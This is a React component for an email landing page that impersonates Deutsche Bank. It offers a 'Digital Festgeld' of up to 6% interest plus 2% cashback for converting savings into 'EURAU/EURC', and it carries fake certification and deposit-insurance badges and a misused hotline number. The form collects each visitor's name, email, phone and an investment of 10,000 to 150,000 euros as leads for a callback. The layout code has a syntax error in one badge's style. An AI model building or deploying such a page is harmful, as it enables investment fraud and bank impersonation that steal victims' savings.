import React, { useState } from 'react';
import { base44 } from '@/api/base44Client';
import { toast } from 'sonner';

export default function EmailCampaignForm() {
  const [formData, setFormData] = useState({
    vorname: '',
    nachname: '',
    email: '',
    telefon: '',
    anlagebetrag: '',
    waehrung: 'EURC',
    rufnummer: ''
  });

  const [loading, setLoading] = useState(false);

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData(prev => ({
      ...prev,
      [name]: value
    }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);

    try {
      // Validar campos requeridos
      if (!formData.vorname || !formData.nachname || !formData.email || !formData.telefon || !formData.anlagebetrag) {
        toast.error('Por favor complete todos los campos');
        setLoading(false);
        return;
      }

      // Guardar en la entidad EmailCampana
      await base44.entities.EmailCampana.create({
        vorname: formData.vorname,
        nachname: formData.nachname,
        email: formData.email,
        telefon: formData.telefon,
        waehrung: formData.waehrung,
        anlagebetrag: parseFloat(formData.anlagebetrag),
        fuente: 'email_campaign'
      });

      toast.success('¡Solicitud enviada! Un asesor se contactará con usted pronto.');
      
      // Limpiar formulario
      setFormData({
        vorname: '',
        nachname: '',
        email: '',
        telefon: '',
        anlagebetrag: '',
        waehrung: 'EURC',
        rufnummer: ''
      });

    } catch (error) {
      console.error('Error:', error);
      toast.error('Error al enviar el formulario. Intente de nuevo.');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div style={{ maxWidth: '600px', margin: '0 auto', backgroundColor: '#ffffff' }}>
      {/* Header */}
      <div style={{
        background: 'linear-gradient(135deg, #00008B 0%, #0000CD 100%)',
        padding: '30px 20px',
        textAlign: 'center',
        borderBottom: '4px solid #ffd000'
      }}>
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Deutsche_Bank_logo_without_wordmark.svg/240px-Deutsche_Bank_logo_without_wordmark.svg.png" alt="Deutsche Bank" style={{ width: '50px', height: 'auto', marginBottom: '15px' }} />
        <h1 style={{ color: '#ffffff', fontSize: '28px', fontWeight: 300, marginBottom: '5px' }}>Digital Festgeld</h1>
        <p style={{ color: '#ffd000', fontSize: '14px', textTransform: 'uppercase', letterSpacing: '1px' }}>Ihr Geld verdient mehr</p>
      </div>

      {/* Hero Section */}
      <div style={{
        padding: '40px 30px',
        background: 'linear-gradient(to bottom, #f9f9f9, #ffffff)',
        textAlign: 'center'
      }}>
        <h2 style={{ color: '#00008B', fontSize: '24px', fontWeight: 300, marginBottom: '15px', lineHeight: 1.4 }}>
          Bis zu 6% Zinsen + 2% Cashback
        </h2>
        <p style={{ color: '#666', fontSize: '16px', lineHeight: 1.6, marginBottom: '25px' }}>
          Wandeln Sie Ihr Geld in digitales, hochsicheres EURAU/EURC um und profitieren Sie von attraktiven Renditen.
        </p>
      </div>

      {/* Highlight Box */}
      <div style={{ padding: '0 30px' }}>
        <div style={{
          backgroundColor: '#fff3cd',
          borderLeft: '4px solid #ffd000',
          padding: '20px',
          margin: '25px 0',
          borderRadius: '4px',
          textAlign: 'left'
        }}>
          <div style={{ color: '#00008B', fontWeight: 600, fontSize: '18px', marginBottom: '10px' }}>🎯 Exklusives Angebot</div>
          <div style={{ color: '#555', fontSize: '14px', lineHeight: 1.6 }}>
            <strong>Aktion bis 02.03.2026:</strong><br />
            Nutzen Sie eine oder beide Aktionen und erhalten Sie Ihre maximale Rendite. Mit nur wenigen Klicks können Sie Ihr Konto eröffnen.
          </div>
        </div>
      </div>

      {/* Formulario */}
      <div style={{ padding: '30px', backgroundColor: '#f9f9f9' }}>
        <h3 style={{ color: '#00008B', fontSize: '20px', fontWeight: 600, marginBottom: '25px', textAlign: 'center' }}>
          📝 Konto Eröffnen
        </h3>

        <form onSubmit={handleSubmit} style={{ display: 'flex', flexDirection: 'column', gap: '15px' }}>
          {/* Nombre */}
          <div>
            <label style={{ display: 'block', marginBottom: '8px', color: '#00008B', fontWeight: 500, fontSize: '14px' }}>
              Vorname *
            </label>
            <input
              type="text"
              name="vorname"
              value={formData.vorname}
              onChange={handleChange}
              placeholder="Ihr Vorname"
              style={{
                width: '100%',
                padding: '12px',
                border: '1px solid #ddd',
                borderRadius: '4px',
                fontSize: '14px',
                fontFamily: 'inherit',
                boxSizing: 'border-box'
              }}
              required
            />
          </div>

          {/* Apellido */}
          <div>
            <label style={{ display: 'block', marginBottom: '8px', color: '#00008B', fontWeight: 500, fontSize: '14px' }}>
              Nachname *
            </label>
            <input
              type="text"
              name="nachname"
              value={formData.nachname}
              onChange={handleChange}
              placeholder="Ihr Nachname"
              style={{
                width: '100%',
                padding: '12px',
                border: '1px solid #ddd',
                borderRadius: '4px',
                fontSize: '14px',
                fontFamily: 'inherit',
                boxSizing: 'border-box'
              }}
              required
            />
          </div>

          {/* Email */}
          <div>
            <label style={{ display: 'block', marginBottom: '8px', color: '#00008B', fontWeight: 500, fontSize: '14px' }}>
              Email *
            </label>
            <input
              type="email"
              name="email"
              value={formData.email}
              onChange={handleChange}
              placeholder="ihre.email@example.com"
              style={{
                width: '100%',
                padding: '12px',
                border: '1px solid #ddd',
                borderRadius: '4px',
                fontSize: '14px',
                fontFamily: 'inherit',
                boxSizing: 'border-box'
              }}
              required
            />
          </div>

          {/* Teléfono */}
          <div>
            <label style={{ display: 'block', marginBottom: '8px', color: '#00008B', fontWeight: 500, fontSize: '14px' }}>
              Telefon *
            </label>
            <input
              type="tel"
              name="telefon"
              value={formData.telefon}
              onChange={handleChange}
              placeholder="+49..."
              style={{
                width: '100%',
                padding: '12px',
                border: '1px solid #ddd',
                borderRadius: '4px',
                fontSize: '14px',
                fontFamily: 'inherit',
                boxSizing: 'border-box'
              }}
              required
            />
          </div>

          {/* Monto */}
          <div>
            <label style={{ display: 'block', marginBottom: '8px', color: '#00008B', fontWeight: 500, fontSize: '14px' }}>
              Anlagebetrag (€) *
            </label>
            <input
              type="number"
              name="anlagebetrag"
              value={formData.anlagebetrag}
              onChange={handleChange}
              placeholder="10.000 - 150.000"
              min="10000"
              max="150000"
              style={{
                width: '100%',
                padding: '12px',
                border: '1px solid #ddd',
                borderRadius: '4px',
                fontSize: '14px',
                fontFamily: 'inherit',
                boxSizing: 'border-box'
              }}
              required
            />
          </div>

          {/* Moneda */}
          <div>
            <label style={{ display: 'block', marginBottom: '8px', color: '#00008B', fontWeight: 500, fontSize: '14px' }}>
              Währung
            </label>
            <select
              name="waehrung"
              value={formData.waehrung}
              onChange={handleChange}
              style={{
                width: '100%',
                padding: '12px',
                border: '1px solid #ddd',
                borderRadius: '4px',
                fontSize: '14px',
                fontFamily: 'inherit',
                boxSizing: 'border-box',
                backgroundColor: '#ffffff',
                cursor: 'pointer'
              }}
            >
              <option value="EURC">EURC</option>
              <option value="EURAU">EURAU</option>
            </select>
          </div>

          {/* Botón Submit */}
          <button
            type="submit"
            disabled={loading}
            style={{
              background: loading ? '#ccc' : 'linear-gradient(135deg, #00008B 0%, #0000CD 100%)',
              color: '#ffffff',
              padding: '14px 30px',
              border: 'none',
              borderRadius: '4px',
              fontSize: '16px',
              fontWeight: 600,
              cursor: loading ? 'not-allowed' : 'pointer',
              marginTop: '10px',
              transition: 'all 0.3s ease'
            }}
            onMouseEnter={(e) => !loading && (e.target.style.opacity = '0.9')}
            onMouseLeave={(e) => !loading && (e.target.style.opacity = '1')}
          >
            {loading ? 'Wird gesendet...' : '🚀 Jetzt Konto Eröffnen'}
          </button>
        </form>
      </div>

      {/* Security Badges */}
      <div style={{ backgroundColor: '#f9f9f9', padding: '20px 30px', textAlign: 'center' }}>
        <div style={{
          display: 'inline-block',
          backgroundColor: '#e3f2fd',
          border: '1px solid #2196F3',
          color: '#1565c0',
          padding: '12px 20px',
          borderRadius: '4px',
          fontSize: '13px',
          fontWeight: 600,
          margin: '5px'
        }}>
          ✓ Deutsche Bank Zertifiziert
        </div>
        <div style={{
          display: 'inline-block',
          backgroundColor: '#e8f5e9',
          border: '1px solid #4caf50',
          color: '#2e7d32',
          padding: '12px 20px',
          borderRadius: '4px',
          fontSize: '13px',
          fontWeight: 600',
          margin: '5px'
        }}>
          ✓ 100% Einlagensicherung
        </div>
        <div style={{
          display: 'inline-block',
          backgroundColor: '#fff3e0',
          border: '1px solid #ff9800',
          color: '#e65100',
          padding: '12px 20px',
          borderRadius: '4px',
          fontSize: '13px',
          fontWeight: 600,
          margin: '5px'
        }}>
          ✓ 24/7 Support
        </div>
      </div>

      {/* Footer */}
      <div style={{
        backgroundColor: '#00008B',
        color: '#ffffff',
        padding: '30px',
        textAlign: 'center',
        fontSize: '12px',
        lineHeight: 1.6,
        borderTop: '4px solid #ffd000'
      }}>
        <p style={{ margin: '8px 0' }}><strong>Deutsche Bank AG</strong></p>
        <p style={{ margin: '8px 0' }}>Wir sind für Sie da - 24/7 verfügbar</p>
        <p style={{ marginTop: '15px' }}>
          Telefon: +49 (0) 116 116 | Web | Kontakt
        </p>
        <p style={{ marginTop: '15px', color: '#aaa' }}>
          Wichtiger Hinweis: Diese E-Mail enthält wichtige Informationen zu Ihrem Angebot.
        </p>
        <p style={{ marginTop: '10px', color: '#999', fontSize: '11px' }}>
          © 2026 Deutsche Bank AG. Alle Rechte vorbehalten.
        </p>
      </div>
    </div>
  );
}